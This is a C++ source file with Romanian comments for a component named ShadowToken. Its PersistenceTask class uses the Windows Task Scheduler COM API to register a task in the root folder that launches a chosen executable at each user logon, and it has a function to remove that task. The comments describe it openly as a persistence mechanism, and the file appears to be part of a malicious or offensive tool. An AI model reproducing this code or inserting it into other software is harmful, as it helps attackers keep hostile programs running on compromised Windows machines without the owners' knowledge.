#include <windows.h>
#include <taskschd.h>
#include <comdef.h>
#include <iostream>

#pragma comment(lib, "taskschd.lib")
#pragma comment(lib, "comsupp.lib")

namespace ShadowToken {

    class PersistenceTask {
    public:
        // Creează un task programat pentru a seta persistența ShadowToken
        bool CreateScheduledTask(const std::wstring& taskName, const std::wstring& exePath) {
            // Inițializează COM
            HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut inițializa COM: " << hr << std::endl;
                return false;
            }

            // Creează o instanță pentru Task Scheduler
            ITaskService* pService = nullptr;
            hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut crea instanța Task Scheduler: " << hr << std::endl;
                CoUninitialize();
                return false;
            }

            // Conectare la Task Scheduler
            hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut conecta la Task Scheduler: " << hr << std::endl;
                pService->Release();
                CoUninitialize();
                return false;
            }

            // Creează un task folder (dacă este necesar)
            ITaskFolder* pRootFolder = nullptr;
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut accesa root folderul Task Scheduler: " << hr << std::endl;
                pService->Release();
                CoUninitialize();
                return false;
            }

            // Elimină un task anterior cu același nume, dacă există
            pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);

            // Creează un task nou
            ITaskDefinition* pTask = nullptr;
            hr = pService->NewTask(0, &pTask);
            pService->Release();
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut crea definiția task-ului: " << hr << std::endl;
                pRootFolder->Release();
                CoUninitialize();
                return false;
            }

            // Configurare task pentru a porni la logon
            IRegistrationInfo* pRegInfo = nullptr;
            hr = pTask->get_RegistrationInfo(&pRegInfo);
            if (SUCCEEDED(hr)) {
                pRegInfo->Release();
            }

            ITriggerCollection* pTriggerCollection = nullptr;
            hr = pTask->get_Triggers(&pTriggerCollection);
            if (SUCCEEDED(hr)) {
                ITrigger* pTrigger = nullptr;
                hr = pTriggerCollection->Create(TASK_TRIGGER_LOGON, &pTrigger);
                pTrigger->Release();
                pTriggerCollection->Release();
            }

            IActionCollection* pActionCollection = nullptr;
            hr = pTask->get_Actions(&pActionCollection);
            if (SUCCEEDED(hr)) {
                IAction* pAction = nullptr;
                hr = pActionCollection->Create(TASK_ACTION_EXEC, &pAction);

                IExecAction* pExecAction = nullptr;
                hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                pExecAction->put_Path(_bstr_t(exePath.c_str()));
                pExecAction->Release();
                pAction->Release();
                pActionCollection->Release();
            }

            // Înregistrează task-ul în folderul root
            IRegisteredTask* pRegisteredTask = nullptr;
            hr = pRootFolder->RegisterTaskDefinition(_bstr_t(taskName.c_str()), pTask, TASK_CREATE_OR_UPDATE, _variant_t(), _variant_t(), TASK_LOGON_INTERACTIVE_TOKEN, _variant_t(L""), &pRegisteredTask);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut înregistra task-ul: " << hr << std::endl;
                pRootFolder->Release();
                pTask->Release();
                CoUninitialize();
                return false;
            }

            // Cleanup
            std::cout << "[Success] Task-ul programat pentru persistență a fost creat cu succes." << std::endl;
            pRootFolder->Release();
            pTask->Release();
            pRegisteredTask->Release();
            CoUninitialize();
            return true;
        }

        // Elimină task-ul programat pentru persistență
        bool RemoveScheduledTask(const std::wstring& taskName) {
            HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut inițializa COM: " << hr << std::endl;
                return false;
            }

            ITaskService* pService = nullptr;
            hr = CoCreateInstance(CLSID_TaskScheduler, nullptr, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut crea instanța Task Scheduler: " << hr << std::endl;
                CoUninitialize();
                return false;
            }

            hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut conecta la Task Scheduler: " << hr << std::endl;
                pService->Release();
                CoUninitialize();
                return false;
            }

            ITaskFolder* pRootFolder = nullptr;
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
            if (FAILED(hr)) {
                std::cerr << "[Error] Nu s-a putut accesa root folderul Task Scheduler: " << hr << std::endl;
                pService->Release();
                CoUninitialize();
                return false;
            }

            hr = pRootFolder->DeleteTask(_bstr_t(taskName.c_str()), 0);
            if (FAILED(hr)) {
                std::cerr << "[Error] Ștergerea task-ului programat a eșuat: " << hr << std::endl;
                pRootFolder->Release();
                CoUninitialize();
                return false;
            }

            std::cout << "[Success] Task-ul programat a fost eliminat cu succes." << std::endl;
            pRootFolder->Release();
            CoUninitialize();
            return true;
        }
    };
}
